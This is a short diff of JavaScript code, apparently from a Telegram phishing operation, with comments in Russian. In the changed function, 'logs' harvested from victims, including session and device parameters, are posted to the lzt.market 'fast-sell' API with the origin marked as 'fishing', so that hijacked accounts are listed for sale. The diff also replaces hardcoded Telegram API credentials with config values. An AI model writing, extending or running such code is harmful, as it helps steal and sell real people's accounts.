@@ -48,6 +48,7 @@ ${log.bot.includes(':') ? `ℹ️ Добытый с бота @${(await new Teleg
 
     if (worker.lztOn && marketSettings) {
         async function send() {
+            console.log("Отправляем логи на лолз", log.deviceParams)
             const response = await axios({
                 method: 'POST',
                 url: 'https://api.lzt.market/item/fast-sell?currency=rub&item_origin=fishing',
@@ -68,8 +69,8 @@ ${log.bot.includes(':') ? `ℹ️ Добытый с бота @${(await new Teleg
                         checkSpam: true,
                         telegramClient:
                         {
-                            "telegram_api_id": 2040,
-                            "telegram_api_hash": "b18441a1ff607e10a989891a5462e627",
+                            "telegram_api_id": config.apiId,
+                            "telegram_api_hash": config.apiHash,
                             "telegram_device_model": log.deviceParams.deviceModel,
                             "telegram_system_version": log.deviceParams.systemVersion,
                             "telegram_app_version": log.deviceParams.appVersion
